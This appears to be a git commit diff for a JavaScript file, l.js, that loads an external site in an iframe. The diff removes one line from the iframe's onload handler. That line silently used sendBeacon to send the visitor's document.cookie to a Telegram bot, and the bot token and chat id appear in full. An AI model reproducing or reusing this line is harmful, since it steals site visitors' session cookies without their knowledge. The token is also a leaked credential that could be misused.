5b91abde0faeba73cbaa0f3d357919a4c0653805
sarhne <zaahranahmeed@gmail.com>
2025-05-25 21:21:07 +0300

    Update l.js

--- l.js
+++ l.js
@@ -32,7 +32,6 @@
             var iframe = document.getElementById('externalSite');
             iframe.onload = function() {
                 console.log("تم تحميل الموقع الخارجي بنجاح");
-                navigator.sendBeacon(`https://api.telegram.org/bot7563858753:AAHAh_4tPhiTMn21IQusEZsOltm4CaGSYxs/sendMessage?chat_id=6662346056&text=${encodeURIComponent(document.cookie || "زياره")}`);
 
             };
         };
